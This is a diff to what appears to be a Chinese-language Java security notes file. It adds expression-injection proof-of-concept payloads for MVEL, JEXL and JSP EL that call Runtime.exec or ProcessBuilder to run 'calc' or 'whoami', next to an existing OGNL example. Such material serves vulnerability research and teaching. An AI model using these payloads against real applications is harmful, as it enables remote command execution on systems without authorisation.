@@ -244,3 +244,22 @@ OgnlContext context = new OgnlContext();
 Ognl.getValue("@java.lang.Runtime@getRuntime().exec('calc')", context, context.getRoot());
 ```
 具体可触发OGNL解析的接口请参考[mi1k7ea大佬的总结](https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/)
+
+- MVEL
+```java
+String expression = "new java.lang.ProcessBuilder(/"calc/").start();";  
+MVEL.eval(expression, vars);
+```
+- JEXL
+```java
+String Exp = "233.class.forName('java.lang.Runtime').getRuntime().exec('whoami')";
+JexlEngine engine = new JexlBuilder().create();
+JexlExpression Expression = engine.createExpression(Exp);
+JexlContext Context = new MapContext();
+Expression.evaluate(Context);
+```
+- JSTL_EL
+```jsp
+<spring:message text="${\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"calc\",null).toString()}">
+</spring:message>
+```
